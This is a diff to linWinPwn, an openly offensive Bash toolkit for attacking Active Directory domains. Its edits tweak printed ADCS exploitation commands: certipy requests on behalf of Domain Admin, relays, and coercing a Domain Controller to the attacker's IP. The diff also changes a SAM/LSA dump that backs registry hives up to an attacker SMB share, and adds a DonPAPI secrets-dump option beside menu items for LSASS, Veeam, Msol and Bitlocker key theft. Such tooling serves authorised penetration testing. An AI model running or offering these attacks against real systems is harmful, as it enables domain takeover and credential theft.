@@ -22,7 +22,7 @@ if ! stat "${pass_wordlist}" >/dev/null 2>&1; then pass_wordlist="${wordlists_di
 user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 if ! stat "${user_wordlist}" >/dev/null 2>&1; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
 attacker_interface="eth0"
-attacker_IP=$(ip -f inet addr show $attacker_interface | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+attacker_IP=$(ip -f inet addr show ${attacker_interface} | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
 curr_targets="Domain Controllers"
 targets="DC"
 ldap_port="389"
@@ -150,7 +150,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.2.4 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.2.5 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1900,7 +1900,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
             echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -1928,7 +1928,7 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template User -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -1960,7 +1960,7 @@ adcs_vuln_parse() {
         for vulnca in $esc8_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template DomainController ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ] ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
@@ -1997,7 +1997,7 @@ adcs_vuln_parse() {
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca \"${vulnca//SPACE/ }\" -template [ User ] -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}5. Authenticate using pfx of Domain Admin or DC:${NC}"
@@ -2016,7 +2016,7 @@ adcs_vuln_parse() {
             echo -e "OR"
             echo -e "${certipy} relay -target rpc://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\""
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
         done
     fi
 
@@ -3987,12 +3987,12 @@ samsystem_dump() {
         else
             set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
-            echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support lwpshare ${Credentials_dir}/"
+            echo -e "${impacket_smbserver} -ip ${attacker_IP} -smb2support lwpshare ${Credentials_dir}/"
             read -rp "" </dev/tty
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p "${Credentials_dir}/SAMDump_${user_var}/${i}"
-                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
+                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\${attacker_IP}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
             done
         fi
     fi
@@ -4115,6 +4115,24 @@ donpapi_dump() {
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                 run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_${dc_domain}_${i}.txt"
+            done
+        fi
+    fi
+    echo -e ""
+}
+
+donpapi_noreg_dump() {
+    if ! stat "${donpapi}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
+    else
+        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
+        mkdir -p "${Credentials_dir}/DonPAPI_${user_var}/recover"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
+        else
+            for i in $(/bin/cat "${curr_targets_list}"); do
+                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
+                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -nr -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_nr_${dc_domain}_${i}.txt"
             done
         fi
     fi
@@ -4523,25 +4541,29 @@ modify_target() {
 
 set_attackerIP() {
     echo -e "Please choose the attacker's IPs from the following options:"
-    attacker_IPlist=("$(/usr/bin/hostname -I)")
+    attacker_IPlist=($(/usr/bin/hostname -I))
     for ip in "${attacker_IPlist[@]}"; do
         echo -e "${YELLOW}${ip}${NC}"
     done
     attacker_IP=""
+    matched=false
     read -rp ">> " attacker_IP </dev/tty
-    for ip in "${attacker_IPlist[@]}"; do
-        if [[ "$ip" == "$attacker_IP" ]]; then
-            matched=true
+
+    while [[ -z "${attacker_IP}" || "$matched" != true ]]; do
+        matched=false
+        if [[ -z "${attacker_IP}" ]]; then
+            echo -e "${RED}Empty input.${NC}"
         fi
-    done
-    while [[ $matched == true ]]; do
-        echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list"
-        read -rp ">> " attacker_IP </dev/tty
-        for val in "${attacker_IPlist[@]}"; do
-            if [[ "$val" == "$attacker_IP" ]]; then
+        for ip in "${attacker_IPlist[@]}"; do
+            if [[ "$ip" == "${attacker_IP}" ]]; then
                 matched=true
+                break
             fi
         done
+        if [[ "$matched" != true || -z "${attacker_IP}" ]]; then
+            echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list."
+            read -rp ">> " attacker_IP </dev/tty
+        fi
     done
 }
 
@@ -5912,12 +5934,13 @@ pwd_menu() {
         echo -e "12) Dump LSASS using nanodump"
         echo -e "13) Dump dpapi secrets using netexec"
         echo -e "14) Dump secrets using DonPAPI"
-        echo -e "15) Dump secrets using hekatomb (only on DC)"
-        echo -e "16) Search for juicy information using netexec"
-        echo -e "17) Dump Veeam credentials (only from Veeam server)"
-        echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
-        echo -e "19) Extract Bitlocker Keys"
-        echo -e "20) Dump SAM and LSA secrets using winrm with netexec"
+        echo -e "15) Dump secrets using DonPAPI (Disable Remote Ops operations)"
+        echo -e "16) Dump secrets using hekatomb (only on DC)"
+        echo -e "17) Search for juicy information using netexec"
+        echo -e "18) Dump Veeam credentials (only from Veeam server)"
+        echo -e "19) Dump Msol password (only from Azure AD-Connect server)"
+        echo -e "20) Extract Bitlocker Keys"
+        echo -e "21) Dump SAM and LSA secrets using winrm with netexec"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -6006,31 +6029,36 @@ pwd_menu() {
         ;;
 
     15)
-        hekatomb_dump
+        donpapi_noreg_dump
         pwd_menu
         ;;
 
     16)
-        juicycreds_dump
+        hekatomb_dump
         pwd_menu
         ;;
 
     17)
-        veeam_dump
+        juicycreds_dump
         pwd_menu
         ;;
 
     18)
-        msol_dump
+        veeam_dump
         pwd_menu
         ;;
 
     19)
-        bitlocker_dump
+        msol_dump
         pwd_menu
         ;;
 
     20)
+        bitlocker_dump
+        pwd_menu
+        ;;
+
+    21)
         winrm_dump
         pwd_menu
         ;;
